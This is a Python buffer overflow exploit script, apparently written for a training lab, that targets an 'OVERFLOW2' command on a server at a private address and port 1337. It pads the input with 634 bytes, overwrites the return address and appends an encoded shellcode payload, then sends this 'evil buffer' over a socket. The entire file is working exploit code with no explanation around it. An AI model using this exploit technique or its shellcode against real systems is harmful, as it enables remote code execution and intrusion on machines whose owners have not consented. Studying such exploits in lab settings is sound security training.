import socket

ip = "10.10.28.166"
port = 1337

prefix = "OVERFLOW2 "
offset = 634
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"
padding = ""
payload = ("\xfc\xbb\x42\x59\x49\xb3\xeb\x0c\x5e\x56\x31\x1e\xad\x01"
"\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\xbe\xb1\xcb"
"\xb3\x3e\x42\xac\x3a\xdb\x73\xec\x59\xa8\x24\xdc\x2a\xfc"
"\xc8\x97\x7f\x14\x5a\xd5\x57\x1b\xeb\x50\x8e\x12\xec\xc9"
"\xf2\x35\x6e\x10\x27\x95\x4f\xdb\x3a\xd4\x88\x06\xb6\x84"
"\x41\x4c\x65\x38\xe5\x18\xb6\xb3\xb5\x8d\xbe\x20\x0d\xaf"
"\xef\xf7\x05\xf6\x2f\xf6\xca\x82\x79\xe0\x0f\xae\x30\x9b"
"\xe4\x44\xc3\x4d\x35\xa4\x68\xb0\xf9\x57\x70\xf5\x3e\x88"
"\x07\x0f\x3d\x35\x10\xd4\x3f\xe1\x95\xce\x98\x62\x0d\x2a"
"\x18\xa6\xc8\xb9\x16\x03\x9e\xe5\x3a\x92\x73\x9e\x47\x1f"
"\x72\x70\xce\x5b\x51\x54\x8a\x38\xf8\xcd\x76\xee\x05\x0d"
"\xd9\x4f\xa0\x46\xf4\x84\xd9\x05\x91\x69\xd0\xb5\x61\xe6"
"\x63\xc6\x53\xa9\xdf\x40\xd8\x22\xc6\x97\x1f\x19\xbe\x07"
"\xde\xa2\xbf\x0e\x25\xf6\xef\x38\x8c\x77\x64\xb8\x31\xa2"
"\x2b\xe8\x9d\x1d\x8c\x58\x5e\xce\x64\xb2\x51\x31\x94\xbd"
"\xbb\x5a\x3f\x44\x2c\x6f\xcd\x52\x3b\x07\xcf\x5a\x52\x84"
"\x46\xbc\x3e\x24\x0f\x17\xd7\xdd\x0a\xe3\x46\x21\x81\x8e"
"\x49\xa9\x26\x6f\x07\x5a\x42\x63\xf0\xaa\x19\xd9\x57\xb4"
"\xb7\x75\x3b\x27\x5c\x85\x32\x54\xcb\xd2\x13\xaa\x02\xb6"
"\x89\x95\xbc\xa4\x53\x43\x86\x6c\x88\xb0\x09\x6d\x5d\x8c"
"\x2d\x7d\x9b\x0d\x6a\x29\x73\x58\x24\x87\x35\x32\x86\x71"
"\xec\xe9\x40\x15\x69\xc2\x52\x63\x76\x0f\x25\x8b\xc7\xe6"
"\x70\xb4\xe8\x6e\x75\xcd\x14\x0f\x7a\x04\x9d\x2f\x99\x8c"
"\xe8\xc7\x04\x45\x51\x8a\xb6\xb0\x96\xb3\x34\x30\x67\x40"
"\x24\x31\x62\x0c\xe2\xaa\x1e\x1d\x87\xcc\x8d\x1e\x82\xcc"
"\x31\xe1\x2d")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
